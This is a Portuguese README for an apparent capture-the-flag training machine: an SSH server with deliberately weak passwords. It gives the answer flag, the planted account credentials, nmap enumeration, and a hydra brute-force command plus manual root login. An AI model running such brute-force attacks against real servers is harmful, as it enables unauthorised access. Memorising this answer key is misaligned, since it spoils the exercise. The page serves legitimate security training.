# sshweak — SSH com senhas fracas (Fácil)

Servidor OpenSSH com contas de senha fraca para treinar brute-force.

## Flag
- `CYBERLAB{ssh_brut3_f0rc3_w1n}` — em `/root/flag.txt`

## Contas
```
root:toor    admin:admin    user:password    backup:backup123
```

## Enumeração
```bash
nmap -p 22 -sV IP
python3 /root/tools/portscan.py IP 22
```

## Exploração (hydra)
```bash
hydra -L users.txt -P pass.txt ssh://IP -t 4
# listas prontas de teste:
# users: root admin user backup
# pass:  toor admin password backup123
```

## Exploração (manual)
```bash
ssh root@IP        # senha: toor
whoami
cat /root/flag.txt  # -> flag
```